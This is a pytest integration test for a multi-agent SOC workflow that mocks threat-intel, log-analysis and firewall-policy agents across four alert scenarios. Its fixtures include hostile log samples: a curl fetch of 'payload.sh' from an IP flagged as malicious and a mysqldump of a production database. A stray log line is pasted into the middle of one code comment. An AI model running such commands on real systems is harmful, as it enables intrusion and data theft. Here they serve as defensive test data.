import sys
import os
import pytest
import json

# Add project root to path to allow imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import Pydantic models needed for mocking
from app.agents.log_analyst import LogAnalysis
from app.agents.threat_analyst import ThreatIntel
from app.agents.policy_agent import FirewallRule

# Define test cases using pytest's parametrize feature
test_scenarios = [
    # 1. Benign IP + Benign Logs (False Positive)
    pytest.param(
        "1.1.1.1",
        "User 'healthchecker' logged in.",
        False,  # Mocked VT result
        False, # Mocked Log result
        1,     # Expected Threat Analyst calls
        1,     # Expected Log Analyst calls
        0,     # Expected Policy Agent calls
        2,     # Expected total trace length
        id="benign_ip_benign_logs"
    ),
    # 2. Malicious IP + Benign Logs
    pytest.param(
        "142.250.190.46",
        "User 'guest' accessed marketing_banner.jpg.",
        True,  # Mocked VT result (malicious)
        False, # Mocked Log result
        1,     # Expected Threat Analyst calls
        0,     # Expected Log Analyst calls (CHANGED FROM 1 TO 0 - skipped)
        1,     # Expected Policy Agent calls
        2,     # Expected total trace length (CHANGED FROM 3 TO 2)
        id="malicious_ip_benign_logs"
    ),
    # 3. Benign IP + Malicious Logs
    pytest.param(
        "8.8.8.8",
        "User 'dev-admin' executed 'mysqldump production_db'",
        False, # Mocked VT result
        True,  # Mocked Log result
        1,     # Expected Threat Analyst calls
        1,     # Expected Log Analyst calls
        1,     # Expected Policy Agent calls
        3,     # Expected total trace length
        id="benign_ip_malicious_logs"
    ),
    # 4. Malicious IP + Malicious Logs
    pytest.param(
        "192.241.143.101",
        "User 'www-data' executed 'curl http://192.241.143.101/payload.sh'",
        True,  # Mocked VT result (malicious)
        True,  # Mocked Log result
        1,     # Expected Threat Analyst calls
        0,     # Expected Log Analyst calls (CHANGED FROM 1 TO 0 - skipped)
        1,     # Expected Policy Agent calls
        2,     # Expected total trace length (CHANGED FROM 3 TO 2)
        id="malicious_ip_malicious_logs"
    )
]

@pytest.mark.parametrize(
    "indicator, logs, vt_is_malicious, log_is_anomaly, expected_vt_calls, expected_log_calls, expected_policy_calls, expected_trace_len",
    test_scenarios
)
def test_soc_workflow_scenarios(
    mocker,
    indicator,
    logs,
    vt_is_malicious,
    log_is_anomaly,
    expected_vt_calls,
    expected_log_calls,
    expected_policy_calls,
    expected_trace_len
):
    """
    Runs an end-to-end integration test for the four primary scenarios.
    """
    # 1. ARRANGE: Mock all external dependencies BEFORE importing the graph
    mock_vt_formatter = mocker.patch('app.agents.threat_analyst.formatter_chain')
    mock_vt_formatter.invoke.return_value = ThreatIntel(summary="VT mock", is_malicious=vt_is_malicious)
    
    # We still need to mock the tool executor to [2025-10-02 15:10:20] CMD: User 'dev-admin' executed 'mysqldump -u root -p[REDACTED] production_db > /tmp/backup.sql'.prevent real API calls, but we don't need its return value
    mock_tool_executor = mocker.patch('app.agents.threat_analyst.tool_user_executor')
    mock_tool_executor.invoke.return_value = {"output": "Mocked VirusTotal response"}

    mock_log_chain = mocker.patch('app.agents.log_analyst.log_analyst_chain')
    mock_log_chain.invoke.return_value = LogAnalysis(summary="Log mock", contains_anomaly=log_is_anomaly)
    
    # Mock the policy agent to prevent it from consuming too many tokens in tests
    mock_policy_chain = mocker.patch('app.agents.policy_agent.policy_agent_chain')
    mock_policy_chain.invoke.return_value = FirewallRule(
        name="Mocked Policy",
        action="BLOCK",
        source_ip="0.0.0.0",
        protocol="ANY"
    )

    # Now that mocks are in place, it's safe to import the graph
    from app.main import graph

    initial_state = {
        "alert": {"source": "test alert"},
        "indicator": indicator,
        "logs": logs,
    }

    # 2. ACT: Run the entire graph
    final_state = graph.invoke(initial_state)

    # 3. ASSERT: Verify that the correct nodes were called
    assert mock_vt_formatter.invoke.call_count == expected_vt_calls
    assert mock_log_chain.invoke.call_count == expected_log_calls
    assert mock_policy_chain.invoke.call_count == expected_policy_calls
    assert len(final_state['investigation_trace']) == expected_trace_len